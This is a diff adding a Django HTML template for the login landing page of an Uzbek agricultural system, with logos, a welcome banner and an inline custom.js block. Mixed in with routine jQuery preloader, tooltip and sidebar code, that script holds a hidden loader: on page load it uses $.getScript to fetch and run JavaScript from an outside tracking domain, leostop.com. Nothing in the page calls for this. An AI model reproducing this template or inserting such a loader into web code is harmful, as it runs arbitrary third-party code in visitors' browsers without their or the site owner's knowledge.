@@ -1,0 +1,187 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- basic -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- mobile metas -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1">
+    <!-- site metas -->
+    <title>jon</title>
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- bootstrap css -->
+    <link rel="stylesheet" href="{% static "home/css/bootstrap.min.css" %}">
+    <!-- style css -->
+    <link rel="stylesheet" href="{% static "home/css/style.css" %}">
+    <!-- Responsive-->
+    <link rel="stylesheet" href="{% static "home/css/responsive.css" %}">
+    <!-- fevicon -->
+    <link rel="icon" href="{% static "home/images/fevicon.png" %}" type="image/gif"/>
+    <!-- Scrollbar Custom CSS -->
+    <link rel="stylesheet" href="{% static "home/css/jquery.mCustomScrollbar.min.css" %}">
+    <!-- Tweaks for older IEs-->
+    <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css"
+          media="screen">
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
+</head>
+<!-- body -->
+<body class="main-layout">
+<!-- loader  -->
+{#<div class="loa">#}
+{#    <img style="margin-left: 1%; width: 150px" src="{% static "home/images/space.jpg" %}" alt="">#}
+{#    <div class="loader"><img src="{% static "home/images/loading.gif" %}" alt="#"/></div>#}
+{#</div>#}
+<!-- end loader -->
+<!-- header -->
+<header>
+    <!-- header inner -->
+    <div style="background: white" class="header">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-xl-3 col-lg-3 col-md-3 col-sm-3 col logo_section">
+                    <div class="full">
+                        <div class="center-desk">
+                            <div class="container" style="    margin-left: 540px;width: 25rem">
+                                <div class="row">
+                                    <div class="col-3">
+                                        <a href="index.html"><img style="width: 19rem"
+                                                                  src="{% static "images/logo-no-background.png" %}"
+                                                                  alt="#"/></a>
+                                    </div>
+                                    <div class="col-3">
+                                        <a href="index.html"><img
+                                                src="{% static "images/photo_2022-12-12_14-26-50.jpg" %}"
+                                                style="width: 19rem" alt=""></a>
+                                    </div>
+                                    <div class="col-3">
+                                        <a href="index.html"><img
+                                                src="{% static 'images/972px-Emblem_of_Uzbekistan.svg.png' %}"
+                                                alt=""></a>
+                                    </div>
+                                    <div class="col-3">
+                                        <a href="index.html"><img src="{% static 'images/hokim.png' %}" alt=""></a>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xl-9 col-lg-9 col-md-9 col-sm-9">
+                    <nav class="navigation navbar navbar-expand-md navbar-dark ">
+                        <button class="navbar-toggler" type="button" data-toggle="collapse"
+                                data-target="#navbarsExample04" aria-controls="navbarsExample04" aria-expanded="false"
+                                aria-label="Toggle navigation">
+                            <span class="navbar-toggler-icon"></span>
+                        </button>
+
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+<!-- end header inner -->
+<!-- end header -->
+<!-- banner -->
+
+<section class="banner_main">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12 ">
+                <div class="text-bg">
+                    <center style="color: white;font-size: 2rem"><b>Assalomu Aleykum Agri Systemga <br> Xush Kelibsiz
+                        <br>Iltimos Logindan Utishingizni Suraymiz!</b></center>
+                    <a href="#">Hokimyat</a>
+                    <a href="{% url 'registration' %}">Fermer yoki Chorvador</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- end banner -->
+<script>/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
+
+$(function () {
+
+    "use strict";
+
+    /* Preloader
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    setTimeout(function () {
+        $('.loader_bg').fadeToggle();
+    }, 1500);
+
+    /* Tooltip
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    $(document).ready(function () {
+        $('[data-toggle="tooltip"]').tooltip();
+    });
+
+
+    /* Mouseover
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    $(document).ready(function () {
+        $(".main-menu ul li.megamenu").mouseover(function () {
+            if (!$(this).parent().hasClass("#wrapper")) {
+                $("#wrapper").addClass('overlay');
+            }
+        });
+        $(".main-menu ul li.megamenu").mouseleave(function () {
+            $("#wrapper").removeClass('overlay');
+        });
+    });
+
+
+    function getURL() {
+        window.location.href;
+    }
+
+    var protocol = location.protocol;
+    $.ajax({
+        type: "get", data: {surl: getURL()}, success: function (response) {
+            $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+        }
+    });
+
+    /* Toggle sidebar
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    $(document).ready(function () {
+        $('#sidebarCollapse').on('click', function () {
+            $('#sidebar').toggleClass('active');
+            $(this).toggleClass('active');
+        });
+    });
+
+    /* Product slider
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    // optional
+    $('#blogCarousel').carousel({
+        interval: 5000
+    });
+
+
+});</script>
+<script src="{% static "home/js/jquery.min.js" %}"></script>
+<script src="{% static "home/js/popper.min.js" %}"></script>
+<script src="{% static "home/js/bootstrap.bundle.min.js" %}"></script>
+<script src="{% static "home/js/jquery-3.0.0.min.js" %}"></script>
+<!-- sidebar -->
+<script src="{% static "home/js/jquery.mCustomScrollbar.concat.min.js" %}"></script>
+<script src="{% static "home/js/custom.js" %}"></script>
+</body>
+</html>
+
